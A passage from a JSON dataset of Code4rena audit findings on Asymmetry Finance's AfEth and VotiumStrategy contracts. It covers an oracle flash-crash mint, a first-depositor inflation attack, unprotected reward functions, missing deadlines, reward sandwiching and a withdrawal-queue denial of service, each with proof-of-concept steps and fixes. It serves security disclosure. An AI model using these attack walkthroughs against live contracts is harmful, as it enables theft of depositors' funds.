following:\n\n*   For convenience, assume that 1 safEth is worth 1 ETH.\n*   The `AfEth` contract has the following state:\n    *   `ratio = 5e17` (50%)\n    *   `totalSupply() = 100e18`\n    *   `safEthBalanceMinusPending() = 50e18`\n    *   `vEthStrategy.balanceOf(address(this))` (vAfEth balance) is `50e18`\n*   The `VotiumStrategy` contract has the following state:\n    *   Only 50 vAfEth has been minted so far (`totalSupply() = 50e18`).\n    *   The contract only has 50 CVX in total (`cvxInSystem() = 50e18`).\n    *   This means that [`cvxPerVotium()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L140-L149) returns `1e18` as:\n\n```solidity\n((totalCvx - cvxUnlockObligations) * 1e18) / supply = ((50e18 - 0) * 1e18) / 50e18 = 1e18\n```\n\nThe price of CVX flash crashes from `2e15 / 1e18` ETH per CVX to `100 / 1e18` ETH per CVX. Now, if an attacker calls `deposit()` with 10 ETH:\n\n*   `priceBeforeDeposit`, which is equal to `price()`, is `5e17 + 5e12` as:\n\n```solidity\nsafEthValueInEth = (1e18 * 50e18) / 1e18 = 50e18\nvEthValueInEth = (1e13 * 50e18) / 1e18 = 5e14\n((vEthValueInEth + safEthValueInEth) * 1e18) / totalSupply() = ((50e18 + 5e14) * 1e18) / 100e18 = 5e17 + 5e12\n```\n\n*   Since `ratio` is 50%, 5 ETH is staked into safEth:\n    *   `sMinted = 5e18`, since the price of safEth and ETH is equal.\n*   The other 5 ETH is deposited into `VotiumStrategy`:\n    *   `priceBefore`, which is equal to `cvxPerVotium()`, is `1e18` as shown above.\n    *   Since 1 ETH is worth `1e16` CVX (according to the price above), `cvxAmount = 5e34`.\n    *   Therefore, `vMinted = 5e34` as:\n\n```solidity\nmintAmount = ((cvxAmount * 1e18) / priceBefore) = ((5e34 * 1e18) / 1e18) = 5e34 \n```\n\n*   To calculate `vStrategy.price()` after `VotiumStrategy`'s `deposit()` function is called:\n    *   `ethPerCvx()` returns `1e13`, which is `minAnswer` for the CVX / ETH price fee.\n    *   `cvxPerVotium()` is still `1e18` as:\n\n```solidity\nsupply = totalSupply() = 5e34 + 50e18\ntotalCvx = cvxInSystem() = 5e34 + 50e18\n((totalCvx - cvxUnlockObligations) * 1e18) / supply = ((5e34 + 50e18 - 0) * 1e18) / (5e34 + 50e18) = 1e18\n```\n\n*   Therefore `vStrategy.price()` returns `1e13` as:\n\n```solidity\n(cvxPerVotium() * ethPerCvx(false)) / 1e18 = (1e18 * 1e13) / 1e18 = 1e13\n```\n\n*   To calculate the amount of AfEth minted to the caller:\n\n```solidity\ntotalValue = (5e18 * 1e18) + (5e34 * 1e13) = 5e47 + 5e36\namountToMint = totalValue / priceBeforeDeposit = (5e47 + 5e36) / (5e17 + 5e12) = ~1e30\n```\n\nAs seen from above, the attacker will receive `1e30` AfEth, which is huge compared to the remaining `100e18` held by previous depositors before the flash crash.\n\nTherefore, almost all of the protocol's TVL now belongs to the attacker as he holds most of AfEth's total supply. This results in a loss of funds for all previous depositors.\n\n### Recommended Mitigation\n\nConsider validating that the price returned by Chainlink's price feed does not go below/above a minimum/maximum price:\n\n[VotiumStrategyCore.sol#L173-L181](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L173-L181)\n\n```diff\n        if (\n            (!_validate ||\n                (cl.success == true &&\n                    cl.roundId != 0 &&\n-                   cl.answer >= 0 &&\n+                   cl.answer >= MIN_PRICE &&\n+                   cl.answer <= MAX_PRICE &&\n                    cl.updatedAt != 0 &&\n                    cl.updatedAt <= block.timestamp &&\n                    block.timestamp - cl.updatedAt <= 25 hours))\n        ) {\n```\n\nThis ensures that an incorrect price will never be used should CVX experience a flash crash, thereby protecting the assets of existing depositors.\n\n**[Asymmetry acknowledged](https://github.com/code-423n4/2023-10-asymmetry-mitigation?tab=readme-ov-file#out-of-scope)**\n\n\n***\n\n",
      "summary": "\nThe `ethPerCvx()` function in the VotiumStrategyCore contract relies on a Chainlink oracle to fetch the CVX / ETH price. However, there is no check to ensure that the price returned by the oracle is within a certain range. This can lead to a potential exploit where an attacker can call the `deposit()` function and receive a large amount of afEth due to an incorrect CVX price. This would result in a loss of funds for previous depositors. It is recommended to add validation to ensure that the price returned by the oracle is within a certain range to prevent this exploit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/31",
      "tags": [],
      "finders": [
        "MiloTruck"
      ]
    },
    {
      "id": "29996",
      "title": "[M-08] Inflation attack in VotiumStrategy",
      "impact": "MEDIUM",
      "content": "\nThe VotiumStrategy contract is susceptible to the [Inflation Attack](https://mixbytes.io/blog/overview-of-the-inflation-attack), in which the first depositor can be front-runned by an attacker to steal their deposit.\n\n### Impact\n\nBoth AfEth and VotiumStrategy acts as vaults: accounts deposit some tokens and get back another token (share) that represents their participation in the vault.\n\nThese types of contracts are potentially vulnerable to the inflation attack: an attacker can front-run the initial deposit to the vault to inflate the value of a share and render the front-runned deposit worthless.\n\nIn AfEth, this is successfully mitigated by the slippage control. Any attack that inflates the value of a share to decrease the number of minted shares is rejected due to the validation of minimum output:\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L166-L167>\n\n```solidity\n166:         uint256 amountToMint = totalValue / priceBeforeDeposit;\n167:         if (amountToMint < _minout) revert BelowMinOut();\n```\n\nHowever, this is not the case of VotiumStrategy. In this contract, no validation is done in the number of minted tokens. This means that an attacker can execute the attack by front-running the initial deposit, which may be from AfEth or from any other account that interacts with the contract. See *Proof of Concept* for a detailed walkthrough of the issue.\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L39-L46>\n\n```solidity\n39:     function deposit() public payable override returns (uint256 mintAmount) {\n40:         uint256 priceBefore = cvxPerVotium();\n41:         uint256 cvxAmount = buyCvx(msg.value);\n42:         IERC20(CVX_ADDRESS).approve(VLCVX_ADDRESS, cvxAmount);\n43:         ILockedCvx(VLCVX_ADDRESS).lock(address(this), cvxAmount, 0);\n44:         mintAmount = ((cvxAmount * 1e18) / priceBefore);\n45:         _mint(msg.sender, mintAmount);\n46:     }\n```\n\n### Proof of Concept\n\nLet's say a user wants to deposit in VotiumStrategy and calls `deposit()` sending an ETH amount such as it is expected to buy `X` tokens of CVX. Attacker will front-run the transaction and execute the following:\n\n1.  Initial state is empty contract, `assets = 0` and `supply = 0`.\n2.  Attacker calls deposit with an amount of ETH such as to buy `1e18` CVX tokens, this makes `assets = 1e18` and `supply = 1e18`.\n3.  Attacker calls `requestWithdraw(1e18 - 1)` so that `supply = 1`, assume also `1e18 - 1` CVX tokens are withdrawn so that `cvxUnlockObligations = 1e18 - 1`.\n4.  Attacker transfers (donates) X amount of CVX to VotiumStrategy contract.\n5.  At this point, `priceBefore = cvxPerVotium() = (totalCvx - cvxUnlockObligations) * 1e18 / supply = (X + 1e18 - (1e18 - 1)) * 1e18 / 1 = (X + 1) * 1e18`\n6.  User transaction gets through and `deposit()` buys X amount of CVX. Minted tokens will be `mintAmount = X * 1e18 / priceBefore = X * 1e18 / (X + 1) * 1e18 = X / (X + 1) = 0`.\n7.  User is then minted zero VotiumStrategy tokens.\n8.  Attacker calls `requestWithdraw()` again to queue withdrawal to remove all CVX balance from the contract, including the tokens deposited by the user.\n\n### Recommendation\n\nThere are multiple ways of solving the issue:\n\n1.  Similar to AfEth, add a minimum output check to ensure the amount of minted shares.\n2.  Track asset balances internally so an attacker cannot donate assets to inflate shares.\n3.  Mint an initial number of \"dead shares\", similar to how UniswapV2 does.\n\nA very good discussion of these can be found [here](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706).\n\n**[0xleastwood (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/35#issuecomment-1746303423):**\n > Downgrading this to medium severity because the `_minOut` parameter should actually prevent this attack as long as it's non-zero, but I agree this is of concern if users do not set this parameter. This is a stated assumption.\n>\n > Upon further investigation, `AfEth.deposit()` is not vulnerable to the deposit front-running. This is only an issue if we are interacting with the votium strategy contract directly which is atypical behaviour. However, funds are still at risk even with these stated assumptions so I believe medium severity to be more correct.\n\n**[MiloTruck (Warden) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/35#issuecomment-1752132516):**\n > @0xleastwood - Apologies for commenting after post-judging QA, but isn't the inflation attack still a problem even if users only interact with the `AfEth` contract?\n> \n> `AfEth.deposit()` calls VotiumStrategy's `deposit()` function, so if a user calls `AfEth.deposit()` after VotiumStrategy's state has been manipulated, `vMinted` will be 0, causing him to lose the portion of his ETH that was deposited into VotiumStrategy.\n> \n> Unless I'm missing something here...\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/35#issuecomment-1752133924):**\n> @MiloTruck - Ultimately, I do believe `_minOut` to be sufficient in detecting such an attack.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/35#issuecomment-1753975944)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Track balances instead of using `balanceOf`.\n\n**Status**: Mitigation confirmed. Full details in reports from [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/41) and [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/24).\n\n***\n\n",
      "summary": "\nThe VotiumStrategy contract is vulnerable to a type of attack called the \"Inflation Attack\" where an attacker can manipulate the value of deposited tokens and steal them from the first depositor. This can happen because the contract does not check the number of tokens being minted. The impact of this attack is that it can render the deposited tokens worthless. The AfEth contract has a measure in place to prevent this type of attack, but VotiumStrategy does not. The report suggests three ways to fix this issue, and the Asymmetry team has confirmed that they have implemented a solution to track balances and prevent this attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/35",
      "tags": [],
      "finders": [
        "adriro",
        "MiloTruck"
      ]
    },
    {
      "id": "29995",
      "title": "[M-07] Lack of access control and value validation in the reward flow exposes functions to public access",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L203>\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L272>\n\nSome functions that are part of the Votium reward flow are left unprotected and can be accessed by anyone to spend resources held by the contract.\n\n### Impact\n\nRewards coming from the Votium protocol are claimed and compounded back in AfEth. This flow consists of two parts, both controlled and initiated by the rewarder role: first, rewards are claimed in Votium and Convex using `claimRewards()`, second, those rewards are swapped to ETH and deposited back in the protocol using `applyRewards()`.\n\n![reward](https://user-images.githubusercontent.com/131902879/275634967-8bd434e6-2c0a-47fe-aaf9-4e200561e1b0.png)\n\nAfter rewards are swapped, the VotiumStrategy will call AfEth to manage the deposited rewards, which eventually calls back the VotiumStrategy. These interactions are represented in the previous diagram as steps 5 and 6.\n\nHowever, both of the functions that implement these steps are publicly accessible and don't have any validation over the amount of ETH sent. Let's first see the case of `AfEth::depositRewards()`:\n\n```solidity\n272:     function depositRewards(uint256 _amount) public payable {\n273:        IVotiumStrategy votiumStrategy = IVotiumStrategy(vEthAddress);\n274:         uint256 feeAmount = (_amount * protocolFee) / 1e18;\n275:         if (feeAmount > 0) {\n276:             // solhint-disable-next-line\n277:             (bool sent, ) = feeAddress.call{value: feeAmount}(\"\");\n278:             if (!sent) revert FailedToSend();\n279:         }\n280:         uint256 amount = _amount - feeAmount;\n281:         uint256 safEthTvl = (ISafEth(SAF_ETH_ADDRESS).approxPrice(true) *\n282:             safEthBalanceMinusPending()) / 1e18;\n283:         uint256 votiumTvl = ((votiumStrategy.cvxPerVotium() *\n284:             votiumStrategy.ethPerCvx(true)) *\n285:             IERC20(vEthAddress).balanceOf(address(this))) / 1e36;\n286:         uint256 totalTvl = (safEthTvl + votiumTvl);\n287:         uint256 safEthRatio = (safEthTvl * 1e18) / totalTvl;\n288:         if (safEthRatio < ratio) {\n289:             ISafEth(SAF_ETH_ADDRESS).stake{value: amount}(0);\n290:         } else {\n291:             votiumStrategy.depositRewards{value: amount}(amount);\n292:         }\n293:     }\n```\n\nAs we can see in the previous snippet of code, the function doesn't have any access control and doesn't check if the `_amount` parameter matches the amount of ETH being sent (`msg.value`). Anyone can call this function with any amount value without actually sending any ETH value.\n\nThe implementation of `depositRewards()` in `VotiumStrategyCore` has the same issue:\n\n```solidity\n203:     function depositRewards(uint256 _amount) public payable {\n204:         uint256 cvxAmount = buyCvx(_amount);\n205:         IERC20(CVX_ADDRESS).approve(VLCVX_ADDRESS, cvxAmount);\n206:         ILockedCvx(VLCVX_ADDRESS).lock(address(this), cvxAmount, 0);\n207:         emit DepositReward(cvxPerVotium(), _amount, cvxAmount);\n208:     }\n```\n\nAny ETH held in these two contracts can be arbitrarily spent by any unauthorized account. The caller cannot remove value from here, unless sandwiching the trade or benefitting via a third-party call, but can use these functions to grief and unauthorizedly spend any ETH present in these contracts.\n\n### Recommendation\n\nIf these functions are indeed intended to be publicly accessible, then add a validation to ensure that the amount argument matches the callvalue sent, i.e. `require(_amount == msg.value)`.\n\nOn the other hand, if these should only be part of the reward flow initiated by the rewarder role, then validate that `AfEth::depositRewards()` is called from the Votium Strategy (`vEthAddress`), and validate that `VotiumStrategy::depositRewards()` is called either from AfEth (`manager`) or internally through `applyRewards()`.\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38#issuecomment-1743662053):**\n > @toshiSat - I believe best solution is to get rid of \\_amount and only use msg.value here.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38#issuecomment-1751998547):**\n > This is valid and I think should have been a standalone issue, it seems like anyone can arbitrarily spend native ether in exchange for locked cvx tokens. It is unclear how this might be abused because `applyRewards()` will only transfer out new native ether which was received from its swaps.\n\n**[d3e4 (Warden) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38#issuecomment-1752106853):**\n > @0xleastwood - I mentioned this issue in [L-08](https://github.com/code-423n4/2023-09-asymmetry-findings/blob/main/data/d3e4-Q.md#l-08-depositrewards_amount-do-not-check-that-_amount--msgvalue).\n> \n> However, note that the contracts do not hold any ETH (except [dust](https://github.com/code-423n4/2023-09-asymmetry-findings/blob/main/data/d3e4-Q.md#l-01-dust-loss) or if sent there by mistake) so calling these functions directly wouldn't really do anything. And if there is any ETH in the contract it is just deposited as rewards, which is the only way it should be spent; it cannot be made to send it elsewhere.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38#issuecomment-1752149195):**\n > @d3e4 - These are not equivalent, you talk about the fact that `_amount == msg.value` should be checked but fail to highlight the impact of not having this check. Plus this issue is more than that, the `depositRewards()` function is missing access control.\n>\n> Keeping this as Medium.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38#issuecomment-1753303844):**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Here we did two things, check msg.value instead of passing in amount & make deposit rewards private.\n\n**Status**: Unmitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/40) and [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/27), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThe bug report highlights two functions in the Votium reward flow that do not have proper access control and can be accessed by anyone to spend resources held by the contract. This can potentially lead to unauthorized spending of ETH held in the contracts. The report recommends adding validation to ensure that the amount sent matches the amount specified and implementing access control to limit these functions to authorized accounts. The team has acknowledged the issue and plans to make changes to address it. This bug is still unmitigated, but the team has provided potential solutions in their mitigation review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/38",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "29994",
      "title": "[M-06] Missing deadline check for AfEth actions",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L148> \n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L243>\n\nAfEth main actions execute on-chain swaps and lack an expiration deadline, which enables pending transactions to be maliciously executed at a later point.\n\n### Impact\n\nBoth AfEth deposits and withdrawals include on-chain swaps in AMM protocols as part of their execution, in order to convert the deposited ETH into the different underlying assets held by SafEth and the Votium strategy.\n\nIn the case of SafEth, depending on the derivative, staking may involve swapping ETH for other LSD. For example, the RocketPool derivative implementation uses Balancer to swap between ETH and rETH during deposits:\n\n<https://etherscan.io/address/0xb3e64c481f0fc82344a7045592284fddb9905b8b#code#F1#L157>\n\n```solidity\nfunction deposit() external payable onlyOwner returns (uint256) {\n    uint256 rethBalanceBefore = IERC20(rethAddress()).balanceOf(\n        address(this)\n    );\n    balancerSwap(msg.value);\n    uint256 received = IERC20(rethAddress()).balanceOf(address(this)) -\n        rethBalanceBefore;\n    underlyingBalance = super.finalChecks(\n        ethPerDerivative(true),\n        msg.value,\n        maxSlippage,\n        received,\n        true,\n        underlyingBalance\n    );\n    return received;\n}\n```\n\nIn the case of Votium, deposited ETH is swapped to CVX in order to lock it in Convex. Similarly, when withdrawing, CVX tokens are swapped back to ETH. This is done using a Curve Pool in the `buyCvx()` and `sellCvx()` functions:\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L227-L265>\n\n```solidity\n227:     function buyCvx(\n228:         uint256 _ethAmountIn\n229:     ) internal returns (uint256 cvxAmountOut) {\n230:         address CVX_ETH_CRV_POOL_ADDRESS = 0xB576491F1E6e5E62f1d8F26062Ee822B40B0E0d4;\n231:         // eth -> cvx\n232:         uint256 cvxBalanceBefore = IERC20(CVX_ADDRESS).balanceOf(address(this));\n233:         ICrvEthPool(CVX_ETH_CRV_POOL_ADDRESS).exchange_underlying{\n234:             value: _ethAmountIn\n235:         }(\n236:             0,\n237:             1,\n238:             _ethAmountIn,\n239:             0 // this is handled at the afEth level\n240:         );\n241:         uint256 cvxBalanceAfter = IERC20(CVX_ADDRESS).balanceOf(address(this));\n242:         cvxAmountOut = cvxBalanceAfter - cvxBalanceBefore;\n243:     }\n244: \n245:     /**\n246:      * @notice - Internal utility function to sell cvx for eth\n247:      * @param _cvxAmountIn - Amount of cvx to sell\n248:      * @return ethAmountOut - Amount of eth received\n249:      */\n250:     function sellCvx(\n251:         uint256 _cvxAmountIn\n252:     ) internal returns (uint256 ethAmountOut) {\n253:         address CVX_ETH_CRV_POOL_ADDRESS = 0xB576491F1E6e5E62f1d8F26062Ee822B40B0E0d4;\n254:         // cvx -> eth\n255:         uint256 ethBalanceBefore = address(this).balance;\n256:         IERC20(CVX_ADDRESS).approve(CVX_ETH_CRV_POOL_ADDRESS, _cvxAmountIn);\n257: \n258:         ICrvEthPool(CVX_ETH_CRV_POOL_ADDRESS).exchange_underlying(\n259:             1,\n260:             0,\n261:             _cvxAmountIn,\n262:             0 // this is handled at the afEth level\n263:         );\n264:         ethAmountOut = address(this).balance - ethBalanceBefore;\n265:     }\n```\n\nWhile both actions in AfEth, `deposit()` and `withdraw()`, have a minimum output parameter to control slippage, this doesn't offer protection against when the transaction is actually executed. If the price of the underlying assets drops while the transaction is pending, then the minimum output can still be fulfilled, but the user will get a bad rate due to the stale price. The outdated slippage value now allows for a high slippage trade in detriment of the user.\n\nThis can be also attacked by MEV bots which can still sandwich the transaction to profit on the difference. See [this issue](https://github.com/code-423n4/2022-12-backed-findings/issues/64) for an excellent reference on the topic (the author runs a MEV bot).\n\n### Proof of Concept\n\n1.  A user submits a transaction to deposit in AfEth.\n2.  The transaction sits in the mempool without being included in a block.\n3.  The price of CVX/ETH drops.\n4.  The transaction gets executed by the blockchain.\n5.  Since the price of CVX has dropped, the user will still get the minimum output expected but this will still represent less tokens than it would expect since the transaction has been delayed and the original price is now stale.\n\n### Recommendation\n\nAdd a deadline timestamp to the `deposit()` and `withdraw()` functions, and revert if this timestamp has passed.\n\nNote also that the same should be applied to the VotiumStrategy contract if deposits and withdrawals are made directly there, without going through AfEth.\n\n```diff\n-   function deposit(uint256 _minout) external payable virtual {\n+   function deposit(uint256 _minout, uint256 deadline) external payable virtual {\n            if (pauseDeposit) revert Paused();\n+           if (block.timestamp > deadline) revert StaleAction();\n```\n\n```diff\n    function withdraw(\n        uint256 _withdrawId,\n-       uint256 _minout\n+       uint256 _minout,\n+       uint256 deadline\n    ) external virtual onlyWithdrawIdOwner(_withdrawId) {\n        if (pauseWithdraw) revert Paused();\n+       if (block.timestamp > deadline) revert StaleAction();\n```\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/43#issuecomment-1749768260)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Add a deadline check for deposit & withdraw.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/20) and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/39).\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the AfEth smart contract that allows for malicious execution of pending transactions at a later point. This is due to the lack of an expiration deadline for on-chain swaps, which can result in users receiving a bad rate for their transactions. This can also be exploited by MEV bots. The report recommends adding a deadline timestamp to the deposit and withdrawal functions to prevent this issue. The Asymmetry team has confirmed the bug and implemented a mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/43",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "29993",
      "title": "[M-05] Reward sandwiching in VotiumStrategy",
      "impact": "MEDIUM",
      "content": "\nThe reward system in VotiumStrategy can be potentially gamed by users to enter just before rewards are deposited and request an exit after that. Depending on the withdrawal queue, users may exit as early as the next epoch and avoid waiting the normal 16 weeks of vote locked CVX.\n\n### Impact\n\nVoting in the Convex protocol requires a commitment of at least 16 weeks. Holders of CVX tokens can lock their tokens into vlCVX, which grants them voting power in Curve gauges.\n\nThe same mechanism is applied internally in the VotiumStrategy contract. Deposited ETH is swapped to CVX and locked for vlCVX. Withdrawals are executed in a queued fashion, by reserving tokens that will eventually expire in coming epochs. A user exiting the strategy may have enough tokens to exit their position as early as the next epoch.\n\nThis means that, under the right circumstances, a user may deposit in VotiumStrategy and withdraw from it in a short period of time. The user just needs to have available expirable tokens coming from previous deposits in the platform, not necessarily related to the ones coming from their deposit. This can potentially reduce the commitment, requiring much less time than the required 16 weeks when using Convex directly.\n\nThis would allow users to game the system and enter the protocol just to collect the rewards, with a minimal commitment in the platform.\n\n### Proof of Concept\n\nLet's say an attacker is anticipating the claiming of rewards in VotiumStrategy, and let's assume also that there are enough tokens that will be expiring in the next epoch to sufficiently cover their position.\n\n1.  The attacker deposits into the strategy just before rewards are claimed.\n2.  Rewarder claims rewards and deposits them back into the strategy, increasing the value for holders.\n3.  Right after that, the attacker requests a withdrawal. Since there are enough expirable tokens, the withdrawal is queued for the next epoch.\n4.  The attacker just needs to wait for the next epoch to exit their position, along with the rewards.\n\n### Recommendation\n\nThis is a variation of a common attack in vaults that compound rewards, present in different yield protocols. The usual mitigation is to introduce some delay or penalty to avoid bad intentionally users from depositing just to earn the rewards and leave.\n\nIn this case, two possible solutions are:\n\n*   Introduce some kind of minimum permanency delay for depositors. This could be the 16 weeks defined by Convex, or a fraction of it to be more flexible, e.g. 4 weeks.\n*   Stream rewards over a period of time. Instead of just depositing back the rewards as an immediate increase of value, have these rewards be linearly unlocked over a period of time. This will cause depositors to stay within the protocol to collect the rewards.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/45#issuecomment-1747017488)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Add a minimum epoch of 1 to not allow users to immediately withdraw.\n\n**Status**: Unmitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/21), [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/9), and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/38), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThe VotiumStrategy reward system in the Convex protocol can be exploited by users to receive rewards quickly without committing to the required 16 weeks of vote locked CVX. This can be done by depositing just before rewards are claimed and requesting a withdrawal after. This allows users to game the system and collect rewards with minimal commitment. Possible solutions to mitigate this issue include implementing a minimum permanency delay for depositors or streaming rewards over a period of time. As of now, this bug remains unmitigated and has been confirmed by multiple sources. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/45",
      "tags": [],
      "finders": [
        "adriro",
        "rvierdiiev"
      ]
    },
    {
      "id": "29992",
      "title": "[M-04] VotiumStrategy withdrawal queue fails to consider available unlocked tokens causing different issues in the withdraw process",
      "impact": "MEDIUM",
      "content": "\nWithdrawals in VotiumStrategy are executed in queue since CVX tokens are potentially locked in Convex. However, the implementation fails to consider the case where unlocked assets are already enough to cover the withdrawal, leading to different issues.\n\n### Impact\n\nVotiumStrategy withdrawals are executed in queue since the underlying CVX tokens may be locked in the Convex platform. Depositors must request a withdrawal and wait in queue until the epoch associated with their withdrawal is reached in order to exit their position. The core of this logic is present in the function `requestWithdraw()`:\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L54-L103>\n\n```solidity\n054:     function requestWithdraw(\n055:         uint256 _amount\n056:     ) public override returns (uint256 withdrawId) {\n057:         latestWithdrawId++;\n058:         uint256 _priceInCvx = cvxPerVotium();\n059: \n060:         _burn(msg.sender, _amount);\n061: \n062:         uint256 currentEpoch = ILockedCvx(VLCVX_ADDRESS).findEpochId(\n063:             block.timestamp\n064:         );\n065:         (\n066:             ,\n067:             uint256 unlockable,\n068:             ,\n069:             ILockedCvx.LockedBalance[] memory lockedBalances\n070:         ) = ILockedCvx(VLCVX_ADDRESS).lockedBalances(address(this));\n071:         uint256 cvxAmount = (_amount * _priceInCvx) / 1e18;\n072:         cvxUnlockObligations += cvxAmount;\n073: \n074:         uint256 totalLockedBalancePlusUnlockable = unlockable +\n075:             IERC20(CVX_ADDRESS).balanceOf(address(this));\n076: \n077:         for (uint256 i = 0; i < lockedBalances.length; i++) {\n078:             totalLockedBalancePlusUnlockable += lockedBalances[i].amount;\n079:             // we found the epoch at which there is enough to unlock this position\n080:             if (totalLockedBalancePlusUnlockable >= cvxUnlockObligations) {\n081:                 (, uint32 currentEpochStartingTime) = ILockedCvx(VLCVX_ADDRESS)\n082:                     .epochs(currentEpoch);\n083:                 uint256 timeDifference = lockedBalances[i].unlockTime -\n084:                     currentEpochStartingTime;\n085:                 uint256 epochOffset = timeDifference /\n086:                     ILockedCvx(VLCVX_ADDRESS).rewardsDuration();\n087:                 uint256 withdrawEpoch = currentEpoch + epochOffset;\n088:                 withdrawIdToWithdrawRequestInfo[\n089:                     latestWithdrawId\n090:                 ] = WithdrawRequestInfo({\n091:                     cvxOwed: cvxAmount,\n092:                     withdrawn: false,\n093:                     epoch: withdrawEpoch,\n094:                     owner: msg.sender\n095:                 });\n096: \n097:                 emit WithdrawRequest(msg.sender, cvxAmount, latestWithdrawId);\n098:                 return latestWithdrawId;\n099:             }\n100:         }\n101:         // should never get here\n102:         revert InvalidLockedAmount();\n103:     }\n```\n\nThe implementation first considers available tokens that should be ready to be withdrawn. Line 74-75 sets `totalLockedBalancePlusUnlockable` to the amount of unlockable tokens (expired tokens in Convex that can be withdrawn) plus any available CVX balance in the contract.\n\nHowever, the implementation fails to consider that **this available balance may be already enough to cover the withdrawal**, and proceeds to search within the locked balances by epoch. This will lead to different issues:\n\n*   A user that requests a withdrawal of an amount such that there is enough available balance to cover for it, will still need to wait until the end of the next locked cycle. The implementation will start searching the locked balances array and stop at the first match, and set the withdrawal epoch as the end of the matched period. Even if there are enough tokens to cover for the withdrawal, the user is forced into an unnecessary delay.\n*   If there are none locked balances, meaning everything is already in an unlockable state, the implementation will **cause a denial of service**. The for loop in line 77 won't be executed and the execution will be reverted due to the revert in line 102.\n\n### Proof of Concept\n\nLet's illustrate the denial of service case. We assume all deposits in VotiumStrategy were done before the 16 weeks period, which means all vlCVX should be in an unlocked state.\n\n1.  User calls `requestWithdraw(amount)`.\n2.  The implementation fetches current position from vlCVX contract using `ILockedCvx.lockedBalances()`. This will return the entire position as `unlockable` and an empty array for `lockedBalances`.\n3.  The function sets `totalLockedBalancePlusUnlockable` as `unlockable + 